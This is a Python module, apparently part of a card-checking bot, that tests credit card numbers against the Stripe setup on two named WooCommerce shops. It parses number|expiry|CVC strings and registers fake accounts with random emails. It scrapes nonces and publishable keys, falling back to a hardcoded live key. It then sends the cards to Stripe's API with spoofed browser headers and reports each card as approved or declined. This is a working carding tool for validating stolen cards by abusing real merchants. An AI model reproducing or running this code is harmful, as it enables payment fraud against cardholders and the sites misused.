import sys
import os
import asyncio
import re
import json
import random
import uuid
import warnings
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import aiohttp
from fake_useragent import UserAgent

# Fix encoding for Windows terminal
if sys.platform == 'win32':
    import io
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8')

warnings.filterwarnings("ignore")

# HARDCODED SITES
MAU_SITES = [
    "2poundstreet.com",
    "dilaboards.com"
]

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HELPER FUNCTIONS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except (ValueError, AttributeError):
        return None

def parse_card_data(card_string):
    try:
        card_string = card_string.replace(' ', '')
        if '|' in card_string:
            parts = card_string.split('|')
            if len(parts) >= 4:
                return {
                    'number': parts[0],
                    'exp_month': parts[1],
                    'exp_year': parts[2][-2:] if len(parts[2]) == 4 else parts[2],
                    'cvc': parts[3].strip()
                }
        return None
    except: return None

def generate_random_email():
    import string
    username = ''.join(random.choices(string.ascii_lowercase, k=random.randint(8, 12)))
    number = random.randint(100, 9999)
    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'protonmail.com']
    return f"{username}{number}@{random.choice(domains)}"

def normalize_url(url):
    url = url.strip()
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    url = url.rstrip('/')
    if '/my-account' not in url.lower():
        url += '/my-account'
    if not url.endswith('/'):
        url += '/'
    return url

def generate_guid():
    return str(uuid.uuid4())

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MAIN ASYNC LOGIC
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def process_stripe_card(base_url, card_data, auth_mode=1):
    # REMOVED: proxy_url parameter
    ua = UserAgent()
    
    try:
        if not base_url.startswith('http'):
            base_url = 'https://' + base_url
            
        timeout = aiohttp.ClientTimeout(total=70)
        connector = aiohttp.TCPConnector(ssl=False)
        
        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
            from urllib.parse import urlparse
            parsed = urlparse(base_url)
            domain = f"{parsed.scheme}://{parsed.netloc}"
            email = generate_random_email()
            
            # Auth Mode 1: Register
            if auth_mode == 1:
                headers = {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                    'user-agent': ua.random,
                }
                
                # REMOVED: proxy=proxy_url
                resp = await session.get(base_url, headers=headers)
                resp_text = await resp.text()
                
                register_nonce = (
                    gets(resp_text, 'woocommerce-register-nonce" value="', '"') or
                    gets(resp_text, 'id="woocommerce-register-nonce" value="', '"') or
                    gets(resp_text, 'name="woocommerce-register-nonce" value="', '"')
                )
                
                if register_nonce:
                    username = email.split('@')[0]
                    password = f"Pass{random.randint(100000, 999999)}!"
                    
                    register_data = {
                        'email': email,
                        'wc_order_attribution_source_type': 'typein',
                        'wc_order_attribution_referrer': '(none)',
                        'wc_order_attribution_utm_campaign': '(none)',
                        'wc_order_attribution_utm_source': '(direct)',
                        'wc_order_attribution_utm_medium': '(none)',
                        'wc_order_attribution_utm_content': '(none)',
                        'wc_order_attribution_utm_id': '(none)',
                        'wc_order_attribution_utm_term': '(none)',
                        'wc_order_attribution_utm_source_platform': '(none)',
                        'wc_order_attribution_utm_creative_format': '(none)',
                        'wc_order_attribution_utm_marketing_tactic': '(none)',
                        'wc_order_attribution_session_entry': base_url,
                        'wc_order_attribution_session_start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        'wc_order_attribution_session_pages': '1',
                        'wc_order_attribution_session_count': '1',
                        'wc_order_attribution_user_agent': headers['user-agent'],
                        'woocommerce-register-nonce': register_nonce,
                        '_wp_http_referer': '/my-account/',
                        'register': 'Register',
                    }
                    
                    # REMOVED: proxy=proxy_url
                    reg_resp = await session.post(base_url, headers=headers, data=register_data)
                    reg_text = await reg_resp.text()
                    
                    if 'customer-logout' not in reg_text and 'dashboard' not in reg_text.lower():
                        # REMOVED: proxy=proxy_url
                        resp = await session.get(base_url, headers=headers)
                        resp_text = await resp.text()
                        login_nonce = gets(resp_text, 'woocommerce-login-nonce" value="', '"')
                        if login_nonce:
                            login_data = {'username': username, 'password': password, 'woocommerce-login-nonce': login_nonce, 'login': 'Log in'}
                            # REMOVED: proxy=proxy_url
                            await session.post(base_url, headers=headers, data=login_data)

            # Prepare Payment Page
            add_payment_url = base_url.rstrip('/') + '/add-payment-method/'
            if '/my-account/add-payment-method' not in add_payment_url:
                 add_payment_url = f"{domain}/my-account/add-payment-method/"

            headers = {'user-agent': ua.random}
            # REMOVED: proxy=proxy_url
            resp = await session.get(add_payment_url, headers=headers)
            payment_page_text = await resp.text()
            
            # Extract Nonces
            add_card_nonce = (
                gets(payment_page_text, 'createAndConfirmSetupIntentNonce":"', '"') or
                gets(payment_page_text, 'add_card_nonce":"', '"') or
                gets(payment_page_text, 'name="add_payment_method_nonce" value="', '"') or
                gets(payment_page_text, 'wc_stripe_add_payment_method_nonce":"', '"')
            )
            
            # Extract Stripe Key
            stripe_key = (
                gets(payment_page_text, '"key":"pk_', '"') or
                gets(payment_page_text, 'data-key="pk_', '"') or
                gets(payment_page_text, 'stripe_key":"pk_', '"') or
                gets(payment_page_text, 'publishable_key":"pk_', '"')
            )
            
            if not stripe_key:
                pk_match = re.search(r'pk_live_[a-zA-Z0-9]{24,}', payment_page_text)
                if pk_match: stripe_key = pk_match.group(0)
            
            if not stripe_key:
                stripe_key = 'pk_live_VkUTgutos6iSUgA9ju6LyT7f00xxE5JjCv'
            elif not stripe_key.startswith('pk_'):
                stripe_key = 'pk_' + stripe_key

            # Stripe API Request
            stripe_headers = {
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': ua.random
            }
            
            stripe_data = {
                'type': 'card',
                'card[number]': card_data['number'],
                'card[cvc]': card_data['cvc'],
                'card[exp_month]': card_data['exp_month'],
                'card[exp_year]': card_data['exp_year'],
                'allow_redisplay': 'unspecified',
                'billing_details[address][country]': 'AU',
                'payment_user_agent': 'stripe.js/5e27053bf5; stripe-js-v3/5e27053bf5; payment-element; deferred-intent',
                'referrer': domain,
                'client_attribution_metadata[client_session_id]': generate_guid(),
                'client_attribution_metadata[merchant_integration_source]': 'elements',
                'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
                'client_attribution_metadata[merchant_integration_version]': '2021',
                'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
                'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
                'client_attribution_metadata[elements_session_config_id]': generate_guid(),
                'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
                'guid': generate_guid(), 'muid': generate_guid(), 'sid': generate_guid(),
                'key': stripe_key,
                '_stripe_version': '2024-06-20',
            }
            
            # REMOVED: proxy=proxy_url
            pm_resp = await session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data)
            pm_json = await pm_resp.json()
            
            if 'error' in pm_json:
                return False, pm_json['error']['message']
                
            pm_id = pm_json.get('id')
            if not pm_id: return False, "Failed to create Payment Method"
            
            # Confirm on Site
            confirm_headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': domain,
                'x-requested-with': 'XMLHttpRequest',
                'user-agent': ua.random
            }
            
            endpoints = [
                {'url': f"{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent", 'data': {'wc-stripe-payment-method': pm_id}},
                {'url': f"{domain}/wp-admin/admin-ajax.php", 'data': {'action': 'wc_stripe_create_and_confirm_setup_intent', 'wc-stripe-payment-method': pm_id}},
                {'url': f"{domain}/?wc-ajax=add_payment_method", 'data': {'wc-stripe-payment-method': pm_id, 'payment_method': 'stripe'}},
            ]
            
            for endp in endpoints:
                if not add_card_nonce: continue

                if 'add_payment_method' in endp['url']:
                    endp['data']['woocommerce-add-payment-method-nonce'] = add_card_nonce
                else:
                    endp['data']['_ajax_nonce'] = add_card_nonce
                
                endp['data']['wc-stripe-payment-type'] = 'card'
                
                try:
                    # REMOVED: proxy=proxy_url
                    res = await session.post(endp['url'], data=endp['data'], headers=confirm_headers)
                    text = await res.text()
                    
                    if 'success' in text:
                        js = json.loads(text)
                        if js.get('success'):
                            status = js.get('data', {}).get('status')
                            
                            if status == 'succeeded': 
                                return True, "Payment Method Added"
                            
                            if status == 'requires_action':
                                return False, "Your card was declined. (Status: requires_action)"
                            
                            return True, f"Approved (Status: {status})"
                        else:
                            error_msg = js.get('data', {}).get('error', {}).get('message', 'Declined')
                            return False, error_msg
                except: continue
            
            return False, "Failed to confirm payment method on site"

    except Exception as e:
        return False, f"System Error: {str(e)}"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PUBLIC ENTRY POINT (To be imported by mau.py)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def process_stripe_auth(card_string):
    """
    Main function to be called from mau.py.
    Loops through sites and processes the card asynchronously.
    """
    card_data = parse_card_data(card_string)
    if not card_data:
        return {"status": "ERROR", "response": "Invalid Card Format"}

    # REMOVED: selected_proxy = random.choice(PROXY_LIST)
    current_sites = MAU_SITES[:] 
    
    # Loop through hardcoded sites
    for site in current_sites:
        full_url = normalize_url(site)
        
        try:
            # Call the async processing logic directly
            # REMOVED: proxy_url=selected_proxy
            is_approved, message = await process_stripe_card(full_url, card_data, auth_mode=1)
            
            # Determine status
            if is_approved:
                return {
                    "status": "APPROVED",
                    "response": message,
                    "cc": card_string,
                    "site": site
                }
            else:
                # If declined with a specific reason, stop trying other sites
                # If it's a site error, try next site
                if "System Error" not in message and "Failed to confirm" not in message and "Connection" not in message:
                    return {
                        "status": "DECLINED",
                        "response": message,
                        "cc": card_string,
                        "site": site
                    }
                else:
                    # Site error, try next
                    continue
                    
        except Exception as e:
            print(f"Error processing on {site}: {e}")
            continue
    
    # If loop finishes without returning
    return {
        "status": "ERROR",
        "response": "All sites failed or timed out",
        "cc": card_string
    }
